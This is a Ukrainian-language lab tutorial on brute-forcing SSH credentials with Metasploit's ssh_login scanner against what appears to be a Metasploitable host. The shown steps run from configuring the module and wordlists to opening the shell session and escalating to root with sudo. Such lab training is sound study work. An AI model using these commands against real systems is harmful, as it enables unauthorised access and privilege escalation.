## атака SSH -(атака повним перебором)
 це **атака грубої сили** коли цілі посилається багато різної інформації ( в 99% цу імена і паролі), щоб вияснити яка інформація вірна
 Це не є поки справжньою атакою, тому що ми вносимо запис : **msfadmin**  в два різних списки з іменами логінів і з паролями.
 заходимо в метасплоіт фреймворк:
 msfconsole
 звдаємо пошук search ssh
search ssh
і нас цікавить:
  75   auxiliary/scanner/ssh/ssh_login 
  використовуєм назву модуля і вставляєм в команду:
  use   auxiliary/scanner/ssh/ssh_login
  якщо набрати 
  show options
  ми побачимо багато обовязкових і необовязкових модулів 
  відкриваємо другий термінал для створення файлів імен і паролів
  в терміналі переходимо за допомогою команд на свій робочий стіл і прямо тут створюємо файли паролів і логінів
  cd Desktop  
  ┌──(kali㉿kali)-[~/Desktop]
└─$ nano usernames.txt  

┌──(kali㉿kali)-[~/Desktop]
└─$ nano passwords.txt
потім в терміналі де працюю(дивився опції) вставляю шлях до папок з паролями і логінами
set PASS_FILE /home/kali/Desktop/passwords.txt
якщо ще раз подивитися парамери:
show options
то бачимо що потрібно іще додати хости:
set RHOSTS 192.168.1.58
щоб напечатати всі (навіть збійні ) імена користувачів потрібно ще поміняти значення параметра  **VERBOSE** на значення true 
set VERBOSE true
Тепер можна робити запуск:
run
в результаті перебору найшло правильну комбінацію:
[+] 192.168.1.58:22 - Success: 'msfadmin:msfadmin' 
АЛЕ це не справжня атака, бо **пароль і логін** ми добавляли в список
в метасплойті є багато списків. після находження паролю ми нікуди не перемістились, але можемо **подивитися** сесію командою:
sessions
отримуємо :
Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   192.168.1.95:34003 -> 192.168.1.58:22 (192.168.1.58)
 ## можемо відкрити сесію командою
 sessions -i 1
 де 1 це ID сесії в таблиці
 msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...

whoami
msfadmin
якщо хочеш стати рутом:
sudo su далі ввести пароль який ми знайшли.

## ще один спосіб увійти знаючи імя і пароль:
просто в чистому терміналі  :
 ssh msfadmin@192.168.1.58
